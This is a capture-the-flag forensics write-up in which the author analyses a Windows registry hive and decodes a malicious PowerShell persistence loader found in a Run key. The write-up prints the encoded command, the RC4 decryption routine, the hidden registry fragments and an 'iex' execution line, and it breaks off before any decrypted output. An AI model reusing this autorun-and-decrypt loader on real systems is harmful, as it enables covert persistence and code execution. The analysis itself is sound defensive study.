# Golden Persistence (300)
#### forensics - [HackTheBox CyberApocalypse 2022](../main.md)

## Challenge description:
> The challenge has a downloadable part. 
> 
> Emergency! A space station near Urkir was compromised. Although Urkir is considered to be the very embodiment of the neutral state, it is rich of fuel substances, something that Dreager is very much interested in. Thus, there are now fears that the intergalactic war will also affect this neutral planet. If Draeger and his mercenaries manage to maintain unauthorised access in Urkir's space station and escalate their privileges, they will soon be able to activate the station's defence mechanisms that are able to prevent any spaceship from entering Urkir's airspace. For now, the infected machine is isolated until the case is closed. Help Miyuki find their persistence mechanisms so they cannot gain access again.
> 
> Download file: [forensics_golden_persistence.zip](../assets/forensics_golden_persistence.zip)

## Solution 
We are given a ZIP file. When we unzip it, we are only given one file, `NTUSER.DAT`. Running the `file` command on it, we see it's a Windows registry hive.
```
$ file NTUSER.DAT
NTUSER.DAT: MS Windows registry file, NT/2000 or above
```
A Windows registry hive is a database of keys, subkeys, and values that store information about's a system's configuration.

Looking back at the description, the "persistence mechanisms" must refer to startup processes! 

We can use `hivexsh` to investigate the registry hive. Searching where startup processes are in registry hives, I found [this article](https://devblogs.microsoft.com/powershell/how-to-access-or-modify-startup-items-in-the-window-registry/) saying they are found at the following path:  `[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]`

Upon navigating to the path in hivexsh...

```
$ hivexsh NTUSER.DAT

Welcome to hivexsh, the hivex interactive shell for examining
Windows Registry binary hive files.

Type: 'help' for help summary
      'quit' to quit the shell

NTUSER.DAT\> ls
AppEvents
Console
Control Panel
Environment
EUDC
Keyboard Layout
Network
Printers
SOFTWARE
System
NTUSER.DAT\> cd SOFTWARE\Microsoft\Windows\CurrentVersion\Run
NTUSER.DAT\SOFTWARE\Microsoft\Windows\CurrentVersion\Run> lsval
"OneDrive"="\"C:\\Users\\greth\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\" /background"
"Vh0F75DQu"="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -enc ZgB1AG4AYwB0AGkAbwBuACAAZQBuAGMAcgAgAHsACgAgACAAIAAgAHAAYQByAGEAbQAoAAoAIAAgACAAIAAgACAAIAAgAFsAQgB5AHQAZQBbAF0AXQAkAGQAYQB0AGEALAAKACAAIAAgACAAIAAgACAAIABbAEIAeQB0AGUAWwBdAF0AJABrAGUAeQAKACAAIAAgACAAIAAgACkACgAgAAoAIAAgACAAIABbAEIAeQB0AGUAWwBdAF0AJABiAHUAZgBmAGUAcgAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGQAYQB0AGEALgBMAGUAbgBnAHQAaAAKACAAIAAgACAAJABkAGEAdABhAC4AQwBvAHAAeQBUAG8AKAAkAGIAdQBmAGYAZQByACwAIAAwACkACgAgACAAIAAgAAoAIAAgACAAIABbAEIAeQB0AGUAWwBdAF0AJABzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABCAHkAdABlAFsAXQAgADIANQA2ADsACgAgACAAIAAgAFsAQgB5AHQAZQBbAF0AXQAkAGsAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAEIAeQB0AGUAWwBdACAAMgA1ADYAOwAKACAACgAgACAAIAAgAGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAyADUANgA7ACAAJABpACsAKwApAAoAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAIAAgACQAcwBbACQAaQBdACAAPQAgAFsAQgB5AHQAZQBdACQAaQA7AAoAIAAgACAAIAAgACAAIAAgACQAawBbACQAaQBdACAAPQAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0AOwAKACAAIAAgACAAfQAKACAACgAgACAAIAAgACQAagAgAD0AIAAwADsACgAgACAAIAAgAGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAyADUANgA7ACAAJABpACsAKwApAAoAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAIAAgACQAagAgAD0AIAAoACQAagAgACsAIAAkAHMAWwAkAGkAXQAgACsAIAAkAGsAWwAkAGkAXQApACAAJQAgADIANQA2ADsACgAgACAAIAAgACAAIAAgACAAJAB0AGUAbQBwACAAPQAgACQAcwBbACQAaQBdADsACgAgACAAIAAgACAAIAAgACAAJABzAFsAJABpAF0AIAA9ACAAJABzAFsAJABqAF0AOwAKACAAIAAgACAAIAAgACAAIAAkAHMAWwAkAGoAXQAgAD0AIAAkAHQAZQBtAHAAOwAKACAAIAAgACAAfQAKACAACgAgACAAIAAgACQAaQAgAD0AIAAkAGoAIAA9ACAAMAA7AAoAIAAgACAAIABmAG8AcgAgACgAJAB4ACAAPQAgADAAOwAgACQAeAAgAC0AbAB0ACAAJABiAHUAZgBmAGUAcgAuAEwAZQBuAGcAdABoADsAIAAkAHgAKwArACkACgAgACAAIAAgAHsACgAgACAAIAAgACAAIAAgACAAJABpACAAPQAgACgAJABpACAAKwAgADEAKQAgACUAIAAyADUANgA7AAoAIAAgACAAIAAgACAAIAAgACQAagAgAD0AIAAoACQAagAgACsAIAAkAHMAWwAkAGkAXQApACAAJQAgADIANQA2ADsACgAgACAAIAAgACAAIAAgACAAJAB0AGUAbQBwACAAPQAgACQAcwBbACQAaQBdADsACgAgACAAIAAgACAAIAAgACAAJABzAFsAJABpAF0AIAA9ACAAJABzAFsAJABqAF0AOwAKACAAIAAgACAAIAAgACAAIAAkAHMAWwAkAGoAXQAgAD0AIAAkAHQAZQBtAHAAOwAKACAAIAAgACAAIAAgACAAIABbAGkAbgB0AF0AJAB0ACAAPQAgACgAJABzAFsAJABpAF0AIAArACAAJABzAFsAJABqAF0AKQAgACUAIAAyADUANgA7AAoAIAAgACAAIAAgACAAIAAgACQAYgB1AGYAZgBlAHIAWwAkAHgAXQAgAD0AIAAkAGIAdQBmAGYAZQByAFsAJAB4AF0AIAAtAGIAeABvAHIAIAAkAHMAWwAkAHQAXQA7AAoAIAAgACAAIAB9AAoAIAAKACAAIAAgACAAcgBlAHQAdQByAG4AIAAkAGIAdQBmAGYAZQByAAoAfQAKAAoACgBmAHUAbgBjAHQAaQBvAG4AIABIAGUAeABUAG8AQgBpAG4AIAB7AAoAIAAgACAAIABwAGEAcgBhAG0AKAAKACAAIAAgACAAWwBQAGEAcgBhAG0AZQB0AGUAcgAoAAoAIAAgACAAIAAgACAAIAAgAFAAbwBzAGkAdABpAG8AbgA9ADAALAAgAAoAIAAgACAAIAAgACAAIAAgAE0AYQBuAGQAYQB0AG8AcgB5AD0AJAB0AHIAdQBlACwAIAAKACAAIAAgACAAIAAgACAAIABWAGEAbAB1AGUARgByAG8AbQBQAGkAcABlAGwAaQBuAGUAPQAkAHQAcgB1AGUAKQAKACAAIAAgACAAXQAgACAAIAAKACAAIAAgACAAWwBzAHQAcgBpAG4AZwBdACQAcwApAAoAIAAgACAAIAAkAHIAZQB0AHUAcgBuACAAPQAgAEAAKAApAAoAIAAgACAAIAAKACAAIAAgACAAZgBvAHIAIAAoACQAaQAgAD0AIAAwADsAIAAkAGkAIAAtAGwAdAAgACQAcwAuAEwAZQBuAGcAdABoACAAOwAgACQAaQAgACsAPQAgADIAKQAKACAAIAAgACAAewAKACAAIAAgACAAIAAgACAAIAAkAHIAZQB0AHUAcgBuACAAKwA9ACAAWwBCAHkAdABlAF0AOgA6AFAAYQByAHMAZQAoACQAcwAuAFMAdQBiAHMAdAByAGkAbgBnACgAJABpACwAIAAyACkALAAgAFsAUwB5AHMAdABlAG0ALgBHAGwAbwBiAGEAbABpAHoAYQB0AGkAbwBuAC4ATgB1AG0AYgBlAHIAUwB0AHkAbABlAHMAXQA6ADoASABlAHgATgB1AG0AYgBlAHIAKQAKACAAIAAgACAAfQAKACAAIAAgACAACgAgACAAIAAgAFcAcgBpAHQAZQAtAE8AdQB0AHAAdQB0ACAAJAByAGUAdAB1AHIAbgAKAH0ACgAKAFsAQgB5AHQAZQBbAF0AXQAkAGsAZQB5ACAAPQAgACQAZQBuAGMALgBHAGUAdABCAHkAdABlAHMAKAAiAFEAMABtAG0AcAByADQAQgA1AHIAdgBaAGkAMwBwAFMAIgApAAoAJABlAG4AYwByAHkAcAB0AGUAZAAxACAAPQAgACgARwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgAEgASwBDAFUAOgBcAFMATwBGAFQAVwBBAFIARQBcAFoAWQBiADcAOABQADQAcwApAC4AdAAzAFIAQgBrAGEANQB0AEwACgAkAGUAbgBjAHIAeQBwAHQAZQBkADIAIAA9ACAAKABHAGUAdAAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAASABLAEMAVQA6AFwAUwBPAEYAVABXAEEAUgBFAFwAQgBqAHEAQQB0AEkAZQBuACkALgB1AEwAbAB0AGoAagBXAAoAJABlAG4AYwByAHkAcAB0AGUAZAAzACAAPQAgACgARwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgAEgASwBDAFUAOgBcAFMATwBGAFQAVwBBAFIARQBcAEEAcABwAEQAYQB0AGEATABvAHcAXAB0ADAAMwBBADEAUwB0AHEAKQAuAHUAWQA0AFMAMwA5AEQAYQAKACQAZQBuAGMAcgB5AHAAdABlAGQANAAgAD0AIAAoAEcAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAtAFAAYQB0AGgAIABIAEsAQwBVADoAXABTAE8ARgBUAFcAQQBSAEUAXABHAG8AbwBnAGwAZQBcAE4AdgA1ADAAegBlAEcAKQAuAEsAYgAxADkAZgB5AGgAbAAKACQAZQBuAGMAcgB5AHAAdABlAGQANQAgAD0AIAAoAEcAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAtAFAAYQB0AGgAIABIAEsAQwBVADoAXABBAHAAcABFAHYAZQBuAHQAcwBcAEoAeAA2ADYAWgBHADAATwApAC4AagBIADUANABOAFcAOABDAAoAJABlAG4AYwByAHkAcAB0AGUAZAAgAD0AIAAiACQAKAAkAGUAbgBjAHIAeQBwAHQAZQBkADEAKQAkACgAJABlAG4AYwByAHkAcAB0AGUAZAAyACkAJAAoACQAZQBuAGMAcgB5AHAAdABlAGQAMwApACQAKAAkAGUAbgBjAHIAeQBwAHQAZQBkADQAKQAkACgAJABlAG4AYwByAHkAcAB0AGUAZAA1ACkAIgAKACQAZQBuAGMAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAAoAWwBCAHkAdABlAFsAXQBdACQAZABhAHQAYQAgAD0AIABIAGUAeABUAG8AQgBpAG4AIAAkAGUAbgBjAHIAeQBwAHQAZQBkAAoAJABEAGUAYwByAHkAcAB0AGUAZABCAHkAdABlAHMAIAA9ACAAZQBuAGMAcgAgACQAZABhAHQAYQAgACQAawBlAHkACgAkAEQAZQBjAHIAeQBwAHQAZQBkAFMAdAByAGkAbgBnACAAPQAgACQAZQBuAGMALgBHAGUAdABTAHQAcgBpAG4AZwAoACQARABlAGMAcgB5AHAAdABlAGQAQgB5AHQAZQBzACkACgAkAEQAZQBjAHIAeQBwAHQAZQBkAFMAdAByAGkAbgBnAHwAaQBlAHgA"
"MicrosoftEdgeAutoLaunch_DD24A963A954FE25E19A66613DE0BF01"="\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --no-startup-window --win-session-start /prefetch:5"
NTUSER.DAT\SOFTWARE\Microsoft\Windows\CurrentVersion\Run>
```

Ah! An encoded PowerShell command. All we have to do is base64 decode it and we're good, right? :)

This was the beginning of one of several mistakes. 

First, I stuck it in [CyberChef](https://gchq.github.io/CyberChef) and used its From Base64 recipe. This returned...
```ps
f.u.n.c.t.i.o.n. .e.n.c.r. .{.
. . . . .p.a.r.a.m.(.
. . . . . . . . .[.B.y.t.e.[.].].$.d.a.t.a.,.
. . . . . . . . .[.B.y.t.e.[.].].$.k.e.y.
. . . . . . .).
. .
. . . . .[.B.y.t.e.[.].].$.b.u.f.f.e.r. .=. .N.e.w.-.O.b.j.e.c.t. .B.y.t.e.[.]. .$.d.a.t.a...L.e.n.g.t.h.
. . . . .$.d.a.t.a...C.o.p.y.T.o.(.$.b.u.f.f.e.r.,. .0.).
. . . . .
. . . . .[.B.y.t.e.[.].].$.s. .=. .N.e.w.-.O.b.j.e.c.t. .B.y.t.e.[.]. .2.5.6.;.
. . . . .[.B.y.t.e.[.].].$.k. .=. .N.e.w.-.O.b.j.e.c.t. .B.y.t.e.[.]. .2.5.6.;.
. .
. . . . .f.o.r. .(.$.i. .=. .0.;. .$.i. .-.l.t. .2.5.6.;. .$.i.+.+.).
. . . . .{.
. . . . . . . . .$.s.[.$.i.]. .=. .[.B.y.t.e.].$.i.;.
. . . . . . . . .$.k.[.$.i.]. .=. .$.k.e.y.[.$.i. .%. .$.k.e.y...L.e.n.g.t.h.].;.
. . . . .}.
. .
. . . . .$.j. .=. .0.;.
. . . . .f.o.r. .(.$.i. .=. .0.;. .$.i. .-.l.t. .2.5.6.;. .$.i.+.+.).
. . . . .{.
. . . . . . . . .$.j. .=. .(.$.j. .+. .$.s.[.$.i.]. .+. .$.k.[.$.i.].). .%. .2.5.6.;.
. . . . . . . . .$.t.e.m.p. .=. .$.s.[.$.i.].;.
. . . . . . . . .$.s.[.$.i.]. .=. .$.s.[.$.j.].;.
. . . . . . . . .$.s.[.$.j.]. .=. .$.t.e.m.p.;.
. . . . .}.
. .
. . . . .$.i. .=. .$.j. .=. .0.;.
. . . . .f.o.r. .(.$.x. .=. .0.;. .$.x. .-.l.t. .$.b.u.f.f.e.r...L.e.n.g.t.h.;. .$.x.+.+.).
. . . . .{.
. . . . . . . . .$.i. .=. .(.$.i. .+. .1.). .%. .2.5.6.;.
. . . . . . . . .$.j. .=. .(.$.j. .+. .$.s.[.$.i.].). .%. .2.5.6.;.
. . . . . . . . .$.t.e.m.p. .=. .$.s.[.$.i.].;.
. . . . . . . . .$.s.[.$.i.]. .=. .$.s.[.$.j.].;.
. . . . . . . . .$.s.[.$.j.]. .=. .$.t.e.m.p.;.
. . . . . . . . .[.i.n.t.].$.t. .=. .(.$.s.[.$.i.]. .+. .$.s.[.$.j.].). .%. .2.5.6.;.
. . . . . . . . .$.b.u.f.f.e.r.[.$.x.]. .=. .$.b.u.f.f.e.r.[.$.x.]. .-.b.x.o.r. .$.s.[.$.t.].;.
. . . . .}.
. .
. . . . .r.e.t.u.r.n. .$.b.u.f.f.e.r.
.}.
.
.
.f.u.n.c.t.i.o.n. .H.e.x.T.o.B.i.n. .{.
. . . . .p.a.r.a.m.(.
. . . . .[.P.a.r.a.m.e.t.e.r.(.
. . . . . . . . .P.o.s.i.t.i.o.n.=.0.,. .
. . . . . . . . .M.a.n.d.a.t.o.r.y.=.$.t.r.u.e.,. .
. . . . . . . . .V.a.l.u.e.F.r.o.m.P.i.p.e.l.i.n.e.=.$.t.r.u.e.).
. . . . .]. . . .
. . . . .[.s.t.r.i.n.g.].$.s.).
. . . . .$.r.e.t.u.r.n. .=. .@.(.).
. . . . .
. . . . .f.o.r. .(.$.i. .=. .0.;. .$.i. .-.l.t. .$.s...L.e.n.g.t.h. .;. .$.i. .+.=. .2.).
. . . . .{.
. . . . . . . . .$.r.e.t.u.r.n. .+.=. .[.B.y.t.e.].:.:.P.a.r.s.e.(.$.s...S.u.b.s.t.r.i.n.g.(.$.i.,. .2.).,. .[.S.y.s.t.e.m...G.l.o.b.a.l.i.z.a.t.i.o.n...N.u.m.b.e.r.S.t.y.l.e.s.].:.:.H.e.x.N.u.m.b.e.r.).
. . . . .}.
. . . . .
. . . . .W.r.i.t.e.-.O.u.t.p.u.t. .$.r.e.t.u.r.n.
.}.
.
.[.B.y.t.e.[.].].$.k.e.y. .=. .$.e.n.c...G.e.t.B.y.t.e.s.(.".Q.0.m.m.p.r.4.B.5.r.v.Z.i.3.p.S.".).
.$.e.n.c.r.y.p.t.e.d.1. .=. .(.G.e.t.-.I.t.e.m.P.r.o.p.e.r.t.y. .-.P.a.t.h. .H.K.C.U.:.\.S.O.F.T.W.A.R.E.\.Z.Y.b.7.8.P.4.s.)...t.3.R.B.k.a.5.t.L.
.$.e.n.c.r.y.p.t.e.d.2. .=. .(.G.e.t.-.I.t.e.m.P.r.o.p.e.r.t.y. .-.P.a.t.h. .H.K.C.U.:.\.S.O.F.T.W.A.R.E.\.B.j.q.A.t.I.e.n.)...u.L.l.t.j.j.W.
.$.e.n.c.r.y.p.t.e.d.3. .=. .(.G.e.t.-.I.t.e.m.P.r.o.p.e.r.t.y. .-.P.a.t.h. .H.K.C.U.:.\.S.O.F.T.W.A.R.E.\.A.p.p.D.a.t.a.L.o.w.\.t.0.3.A.1.S.t.q.)...u.Y.4.S.3.9.D.a.
.$.e.n.c.r.y.p.t.e.d.4. .=. .(.G.e.t.-.I.t.e.m.P.r.o.p.e.r.t.y. .-.P.a.t.h. .H.K.C.U.:.\.S.O.F.T.W.A.R.E.\.G.o.o.g.l.e.\.N.v.5.0.z.e.G.)...K.b.1.9.f.y.h.l.
.$.e.n.c.r.y.p.t.e.d.5. .=. .(.G.e.t.-.I.t.e.m.P.r.o.p.e.r.t.y. .-.P.a.t.h. .H.K.C.U.:.\.A.p.p.E.v.e.n.t.s.\.J.x.6.6.Z.G.0.O.)...j.H.5.4.N.W.8.C.
.$.e.n.c.r.y.p.t.e.d. .=. .".$.(.$.e.n.c.r.y.p.t.e.d.1.).$.(.$.e.n.c.r.y.p.t.e.d.2.).$.(.$.e.n.c.r.y.p.t.e.d.3.).$.(.$.e.n.c.r.y.p.t.e.d.4.).$.(.$.e.n.c.r.y.p.t.e.d.5.).".
.$.e.n.c. .=. .[.S.y.s.t.e.m...T.e.x.t...E.n.c.o.d.i.n.g.].:.:.A.S.C.I.I.
.[.B.y.t.e.[.].].$.d.a.t.a. .=. .H.e.x.T.o.B.i.n. .$.e.n.c.r.y.p.t.e.d.
.$.D.e.c.r.y.p.t.e.d.B.y.t.e.s. .=. .e.n.c.r. .$.d.a.t.a. .$.k.e.y.
.$.D.e.c.r.y.p.t.e.d.S.t.r.i.n.g. .=. .$.e.n.c...G.e.t.S.t.r.i.n.g.(.$.D.e.c.r.y.p.t.e.d.B.y.t.e.s.).
.$.D.e.c.r.y.p.t.e.d.S.t.r.i.n.g.|.i.e.x.
```
Weird, I thought PowerShell just used raw base64? Well, all I have to do is remove all the periods and I'll be fine, right? :)

This was my second mistake.

After sticking it in a text editor and removing all the periods, I got:
```ps
function encr {
    param(
        [Byte[]]$data,
        [Byte[]]$key
      )
 
    [Byte[]]$buffer = New-Object Byte[] $dataLength
    $dataCopyTo($buffer, 0)
    
    [Byte[]]$s = New-Object Byte[] 256;
    [Byte[]]$k = New-Object Byte[] 256;
 
    for ($i = 0; $i -lt 256; $i++)
    {
        $s[$i] = [Byte]$i;
        $k[$i] = $key[$i % $keyLength];
    }
 
    $j = 0;
    for ($i = 0; $i -lt 256; $i++)
    {
        $j = ($j + $s[$i] + $k[$i]) % 256;
        $temp = $s[$i];
        $s[$i] = $s[$j];
        $s[$j] = $temp;
    }
 
    $i = $j = 0;
    for ($x = 0; $x -lt $bufferLength; $x++)
    {
        $i = ($i + 1) % 256;
        $j = ($j + $s[$i]) % 256;
        $temp = $s[$i];
        $s[$i] = $s[$j];
        $s[$j] = $temp;
        [int]$t = ($s[$i] + $s[$j]) % 256;
        $buffer[$x] = $buffer[$x] -bxor $s[$t];
    }
 
    return $buffer
}


function HexToBin {
    param(
    [Parameter(
        Position=0, 
        Mandatory=$true, 
        ValueFromPipeline=$true)
    ]   
    [string]$s)
    $return = @()
    
    for ($i = 0; $i -lt $sLength ; $i += 2)
    {
        $return += [Byte]::Parse($sSubstring($i, 2), [SystemGlobalizationNumberStyles]::HexNumber)
    }
    
    Write-Output $return
}

[Byte[]]$key = $encGetBytes("Q0mmpr4B5rvZi3pS")
$encrypted1 = (Get-ItemProperty -Path HKCU:\SOFTWARE\ZYb78P4s)t3RBka5tL
$encrypted2 = (Get-ItemProperty -Path HKCU:\SOFTWARE\BjqAtIen)uLltjjW
$encrypted3 = (Get-ItemProperty -Path HKCU:\SOFTWARE\AppDataLow\t03A1Stq)uY4S39Da
$encrypted4 = (Get-ItemProperty -Path HKCU:\SOFTWARE\Google\Nv50zeG)Kb19fyhl
$encrypted5 = (Get-ItemProperty -Path HKCU:\AppEvents\Jx66ZG0O)jH54NW8C
$encrypted = "$($encrypted1)$($encrypted2)$($encrypted3)$($encrypted4)$($encrypted5)"
$enc = [SystemTextEncoding]::ASCII
[Byte[]]$data = HexToBin $encrypted
$DecryptedBytes = encr $data $key
$DecryptedString = $encGetString($DecryptedBytes)
$DecryptedString|iex
```
Now this is something I can work with! Skimming the script, I saw the lines with the `$encrypted* =` are just pulling key values from the registry, so I get those manually. The last line executes the decrypted string, so all I need to do is comment that out and print out the decrypted string instead. Easy enough, right? :)

```
$ hivexsh NTUSER.DAT

Welcome to hivexsh, the hivex interactive shell for examining
Windows Registry binary hive files.

Type: 'help' for help summary
      'quit' to quit the shell

NTUSER.DAT\> cd SOFTWARE\ZYb78P4s
NTUSER.DAT\SOFTWARE\ZYb78P4s> lsval
"t3RBka5tL"="F844A6035CF27CC4C90DFEAF579398BE6F7D5ED10270BD12A661DAD04191347559B82ED546015B07317000D8909939A4DA7953AED8B83C0FEE4EB6E120372F536BC5DC39"
NTUSER.DAT\SOFTWARE\ZYb78P4s> cd ..\BjqAtIen
NTUSER.DAT\SOFTWARE\BjqAtIen> lsval
"uLltjjW"="CC19F66A5F3B2E36C9B810FE7CC4D9CE342E8E00138A4F7F5CDD9EED9E09299DD7C6933CF4734E12A906FD9CE1CA57D445DB9CABF850529F5845083F34BA1"
NTUSER.DAT\SOFTWARE\BjqAtIen> cd ..\AppDataLow\t03A1Stq
NTUSER.DAT\SOFTWARE\AppDataLow\t03A1Stq> lsval
"uY4S39Da"="C08114AA67EB979D36DC3EFA0F62086B947F672BD8F966305A98EF93AA39076C3726B0EDEBFA10811A15F1CF1BEFC78AFC5E08AD8CACDB323F44B4D"
NTUSER.DAT\SOFTWARE\AppDataLow\t03A1Stq> cd ..\..\Google\Nv50zeG
NTUSER.DAT\SOFTWARE\Google\Nv50zeG> lsval
"Kb19fyhl"="D814EB4E244A153AF8FAA1121A5CCFD0FEAC8DD96A9B31CCF6C3E3E03C1E93626DF5B3E0B141467116CC08F92147F7A0BE0D95B0172A7F34922D6C236BC7DE54D8ACBFA70D1"
NTUSER.DAT\SOFTWARE\Google\Nv50zeG> cd ..\..\..\AppEvents\Jx66ZG0O
NTUSER.DAT\AppEvents\Jx66ZG0O> lsval
"jH54NW8C"="84AB553E67C743BE696A0AC80C16E2B354C2AE7918EE08A0A3887875C83E44ACA7393F1C579EE41BCB7D336CAF8695266839907F47775F89C1F170562A6B0A01C0F3BC4CB"
```
All I have to do is put these in the PowerShell script, and let it run :)

```ps
function encr {
    param(
        [Byte[]]$data,
        [Byte[]]$key
      )
 
    [Byte[]]$buffer = New-Object Byte[] $dataLength
    $dataCopyTo($buffer, 0)
    
    [Byte[]]$s = New-Object Byte[] 256;
    [Byte[]]$k = New-Object Byte[] 256;
 
    for ($i = 0; $i -lt 256; $i++)
    {
        $s[$i] = [Byte]$i;
        $k[$i] = $key[$i % $keyLength];
    }
 
    $j = 0;
    for ($i = 0; $i -lt 256; $i++)
    {
        $j = ($j + $s[$i] + $k[$i]) % 256;
        $temp = $s[$i];
        $s[$i] = $s[$j];
        $s[$j] = $temp;
    }
 
    $i = $j = 0;
    for ($x = 0; $x -lt $bufferLength; $x++)
    {
        $i = ($i + 1) % 256;
        $j = ($j + $s[$i]) % 256;
        $temp = $s[$i];
        $s[$i] = $s[$j];
        $s[$j] = $temp;
        [int]$t = ($s[$i] + $s[$j]) % 256;
        $buffer[$x] = $buffer[$x] -bxor $s[$t];
    }
 
    return $buffer
}


function HexToBin {
    param(
    [Parameter(
        Position=0, 
        Mandatory=$true, 
        ValueFromPipeline=$true)
    ]   
    [string]$s)
    $return = @()
    
    for ($i = 0; $i -lt $sLength ; $i += 2)
    {
        $return += [Byte]::Parse($sSubstring($i, 2), [SystemGlobalizationNumberStyles]::HexNumber)
    }
    
    Write-Output $return
}

[Byte[]]$key = $encGetBytes("Q0mmpr4B5rvZi3pS")
$encrypted1 = "F844A6035CF27CC4C90DFEAF579398BE6F7D5ED10270BD12A661DAD04191347559B82ED546015B07317000D8909939A4DA7953AED8B83C0FEE4EB6E120372F536BC5DC39"
$encrypted2 = "CC19F66A5F3B2E36C9B810FE7CC4D9CE342E8E00138A4F7F5CDD9EED9E09299DD7C6933CF4734E12A906FD9CE1CA57D445DB9CABF850529F5845083F34BA1"
$encrypted3 = "C08114AA67EB979D36DC3EFA0F62086B947F672BD8F966305A98EF93AA39076C3726B0EDEBFA10811A15F1CF1BEFC78AFC5E08AD8CACDB323F44B4D"
$encrypted4 = "D814EB4E244A153AF8FAA1121A5CCFD0FEAC8DD96A9B31CCF6C3E3E03C1E93626DF5B3E0B141467116CC08F92147F7A0BE0D95B0172A7F34922D6C236BC7DE54D8ACBFA70D1"
$encrypted5 = "84AB553E67C743BE696A0AC80C16E2B354C2AE7918EE08A0A3887875C83E44ACA7393F1C579EE41BCB7D336CAF8695266839907F47775F89C1F170562A6B0A01C0F3BC4CB"
$encrypted = "$($encrypted1)$($encrypted2)$($encrypted3)$($encrypted4)$($encrypted5)"
$enc = [SystemTextEncoding]::ASCII
[Byte[]]$data = HexToBin $encrypted
$DecryptedBytes = encr $data $key
$DecryptedString = $encGetString($DecryptedBytes)
Write-Output $DecryptedString
# $DecryptedString|iex
```
All I have to do now is run it :)
```
$ pwsh solve.ps1
ParserError: 
Line |
   8 |      $dataCopyTo($buffer, 0)
     |                 ~
     | Unexpected token '(' in expression or statement.
```
...

I took a break from the challenge as I was frustrated from feeling steps away from the solution and then feeling like I was nowhere close.

At this point anyone who has ever looked at PowerShell is probably yelling at me. Remember when I removed all the periods? Turns out those are important. Oops.

I didn't realize this until a few hours later, when I was working on another challenge and came across [this article](https://www.pwndefend.com/2021/09/04/decoding-powershell-base64-encoded-commands-in-cyberchef/).

Oops. (I also could have just used `base64 -d`, but I didn't learn that until after the CTF was over.)

After using the proper recipe, subbing in the key values, and commenting out the final line, the script returns:
```
$ pwsh solve.ps1
RuntimeException: 
Line |
  16 |          $k[$i] = $key[$i % $key.Length];
     |          ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     | Attempted to divide by zero.
```

Finally, something I can maybe debug easily! Looking at where $key is defined, it references a $enc.
```ps
[Byte[]]$key = $enc.GetBytes("Q0mmpr4B5rvZi3pS")
```
However, $enc isn't defined anywhere... Except it is? Seven lines later? I moved it before the line, yielding the final script:
```ps
function encr {
    param(
        [Byte[]]$data,
        [Byte[]]$key
      )
 
    [Byte[]]$buffer = New-Object Byte[] $data.Length
    $data.CopyTo($buffer, 0)
    
    [Byte[]]$s = New-Object Byte[] 256;
    [Byte[]]$k = New-Object Byte[] 256;
 
    for ($i = 0; $i -lt 256; $i++)
    {
        $s[$i] = [Byte]$i;
        $k[$i] = $key[$i % $key.Length];
    }
 
    $j = 0;
    for ($i = 0; $i -lt 256; $i++)
    {
        $j = ($j + $s[$i] + $k[$i]) % 256;
        $temp = $s[$i];
        $s[$i] = $s[$j];
        $s[$j] = $temp;
    }
 
    $i = $j = 0;
    for ($x = 0; $x -lt $buffer.Length; $x++)
    {
        $i = ($i + 1) % 256;
        $j = ($j + $s[$i]) % 256;
        $temp = $s[$i];
        $s[$i] = $s[$j];
        $s[$j] = $temp;
        [int]$t = ($s[$i] + $s[$j]) % 256;
        $buffer[$x] = $buffer[$x] -bxor $s[$t];
    }
 
    return $buffer
}


function HexToBin {
    param(
    [Parameter(
        Position=0, 
        Mandatory=$true, 
        ValueFromPipeline=$true)
    ]   
    [string]$s)
    $return = @()
    
    for ($i = 0; $i -lt $s.Length ; $i += 2)
    {
        $return += [Byte]::Parse($s.Substring($i, 2), [System.Globalization.NumberStyles]::HexNumber)
    }
    
    Write-Output $return
}

[Byte[]]$key = $enc.GetBytes("Q0mmpr4B5rvZi3pS")
$encrypted1 = "F844A6035CF27CC4C90DFEAF579398BE6F7D5ED10270BD12A661DAD04191347559B82ED546015B07317000D8909939A4DA7953AED8B83C0FEE4EB6E120372F536BC5DC39"
$encrypted2 = "CC19F66A5F3B2E36C9B810FE7CC4D9CE342E8E00138A4F7F5CDD9EED9E09299DD7C6933CF4734E12A906FD9CE1CA57D445DB9CABF850529F5845083F34BA1"
$encrypted3 = "C08114AA67EB979D36DC3EFA0F62086B947F672BD8F966305A98EF93AA39076C3726B0EDEBFA10811A15F1CF1BEFC78AFC5E08AD8CACDB323F44B4D"
$encrypted4 = "D814EB4E244A153AF8FAA1121A5CCFD0FEAC8DD96A9B31CCF6C3E3E03C1E93626DF5B3E0B141467116CC08F92147F7A0BE0D95B0172A7F34922D6C236BC7DE54D8ACBFA70D1"
$encrypted5 = "84AB553E67C743BE696A0AC80C16E2B354C2AE7918EE08A0A3887875C83E44ACA7393F1C579EE41BCB7D336CAF8695266839907F47775F89C1F170562A6B0A01C0F3BC4CB"
$encrypted = "$($encrypted1)$($encrypted2)$($encrypted3)$($encrypted4)$($encrypted5)"
$enc = [System.Text.Encoding]::ASCII
[Byte[]]$data = HexToBin $encrypted
$DecryptedBytes = encr $data $key
$DecryptedString = $enc.GetString($DecryptedBytes)
Write-Output $DecryptedString
# $DecryptedString|iex
```
Running it...
```
